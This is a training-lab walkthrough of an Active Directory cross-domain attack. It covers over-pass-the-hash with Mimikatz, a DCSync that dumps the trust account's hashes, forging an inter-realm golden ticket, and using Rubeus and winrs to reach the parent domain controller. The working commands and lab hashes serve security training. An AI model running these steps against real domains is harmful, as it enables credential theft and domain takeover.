# Hands-on 20: Cross Domains Attacks - Trust Key

- [Hands-on 20: Cross Domains Attacks - Trust Key](#hands-on-20-cross-domains-attacks---trust-key)
  - [Task](#task)
  - [Using DA access to us.techcorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, techcorp.local using the domain trust key](#using-da-access-to-ustechcorplocal-escalate-privileges-to-enterprise-admin-or-da-to-the-parent-domain-techcorplocal-using-the-domain-trust-key)

---

## Task

Using DA access to us.techcorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, techcorp.local using the domain trust key.

<br/>

---

## Using DA access to us.techcorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, techcorp.local using the domain trust key

The steps of becoming Domain Admins of `us` is in [Hands-on 11: Unconstrained Delegation](l11-UnconstrainedDelegation.md).

As a result, in an elevated shell, use Over pass-the-hash to create a powershell session:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```
. C:\AD\Tools\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command '"sekurlsa::pth /domain:us.techcorp.local /user:administrator /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335 /run:powershell.exe"'
```

![picture 23](images/5f46f6e0958c6fac602d856e3d7a26d0b3b106e6d1bfcca0c4f318cfaff42ae9.png)  

<br/>

In the spawned shell, perform a DCSync to obtain the trust key (NTLM of `techcorp$`):

```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\techcorp$" "exit"
```

![picture 24](images/d801b25e6946ad2ba5e2818b7791d50e722166be6caace8845f3149024de607e.png)  

Note:
techcorp$
- SID: `S-1-5-21-210670787-2521448726-163245708-1103`
- NTLM: `141575e2fb5277f5f4525cae4d410968`
- AES256: `516cdf14d60f39d0dce08336efc1c7047d987f73fd21257bca6bf1b9786e5ead`

<br/>

Forge an inter-realm TGT:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```
. C:\AD\Tools\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command '"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:141575e2fb5277f5f4525cae4d410968 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'
```

![picture 27](images/3174da8445065d79aea6d336b342d0327b26cd23c4a71ce4e3d892362ab832f6.png)  


<br/>

Then use `Rubeus.exe` to request TGS:

```
C:\AD\Tools\Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt
```

![picture 28](images/95869837feaa1a184b688745a5a997f580cfbb1d333ec5007a728feb0fc9dab6.png)  

<br/>

Try to list `techcorp-dc`'s root:

```
ls \\techcorp-dc.techcorp.local\C$
```

![picture 29](images/e8be2b0f95acf889b351b9c224603da52121f4e3b59141a1e131791c7f38087e.png)  


<br/>

To get WinRM:

```
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:HTTP/techcorp-dc.techcorp.local,HOST/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt
```

![picture 30](images/ed4f86449c03bef405595e0bfcb360cab22f6bc73ff1442bfc267345e9cdd985.png)  

![picture 31](images/3c7ccc411562cabaf004ca831db549422f73e06283822151f29d8495cacdde08.png)  

<br/>

Access Forest DC:

```
winrs -r:techcorp-dc.techcorp.local cmd.exe
```

![picture 32](images/7253ee4e169820b4a3417eb5f08a056cc08db928a4d57bc6054d555fa423e4b4.png)  

<br/>

However error occurs when running any command.

![picture 33](images/efce0bd68ab8f1b7081095a2f82e2a705b047d24780de39e01081adb6dd41ea2.png)  

